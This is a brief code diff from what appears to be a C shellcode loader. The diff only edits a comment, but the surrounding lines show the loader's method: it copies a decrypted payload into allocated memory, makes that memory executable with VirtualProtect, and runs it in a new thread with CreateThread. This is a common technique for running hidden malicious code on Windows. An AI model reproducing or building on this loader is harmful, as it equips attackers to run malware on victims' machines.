@@ -57,7 +57,7 @@ int main()
 	// Move the payload into the allocated memory
 	RtlCopyMemory(memBuf, dec_payload, size);
 
-  // Modify memory space Protect
+  // Modify memory space Protect and CreateThread if successful
 	if (VirtualProtect(memBuf, size, PAGE_EXECUTE, &oldProtect) != 0) {
 		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memBuf, 0, 0, 0);
 		WaitForSingleObject(hThread, -1);
